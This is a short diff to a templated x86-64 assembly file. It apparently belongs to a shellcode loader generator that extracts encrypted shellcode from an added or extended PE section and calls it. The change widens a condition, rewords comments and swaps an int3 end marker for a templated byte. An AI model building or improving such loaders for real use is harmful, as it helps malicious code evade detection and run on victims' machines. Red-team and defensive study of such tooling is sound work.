@@ -226,12 +226,12 @@ pop rax
   {{STUB CodeCaveMode STUB}}
 {{end}} // CodeCave
 
-{{if .ExtendSection}}
+{{if or .ExtendSection .CreateSection}}
   // save rsi and rdi
   push rsi
   push rdi
 
-  // extract encrypted shellcode from extended section
+  // extract encrypted shellcode from section
   mov rsi, {{.RegN.rdi}}
   add rsi, {{hex .ShellcodeOffset}}
   mov rdi, [rsp + 0x10]
@@ -277,8 +277,8 @@ pop rax
   call {{.RegV.rax}}
   add rsp, 0x20
 
-  // mark the end of shellcode
-  int3
+  // mark the end of loader
+  {{db .EndOfLoader}}
 
 xor_shift:
   mov {{.RegV.r8}}, {{.RegV.rax}}
